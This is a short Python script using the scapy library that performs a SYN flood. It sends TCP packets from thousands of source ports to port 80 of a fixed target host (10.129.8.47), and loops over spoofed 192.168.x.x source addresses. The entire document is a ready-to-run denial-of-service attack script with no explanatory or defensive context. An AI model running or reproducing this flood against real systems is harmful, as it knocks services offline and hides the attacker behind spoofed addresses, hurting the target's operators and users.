from scapy.all import *
def syn_flood(src, tar):
    for port in range(1024, 65535):
        ip_player = IP(src = src, dst = tar)
        tcp_player = TCP(sport = port, dport = 80)
        pkt = ip_player/tcp_player
        send(pkt)


i = 1
j = 1
for i in range(255):
    for j in range(255):
        print "192.168.%s.%s" %(i, j)
        syn_flood("192.168.%s.%s" %(i, j), '10.129.8.47')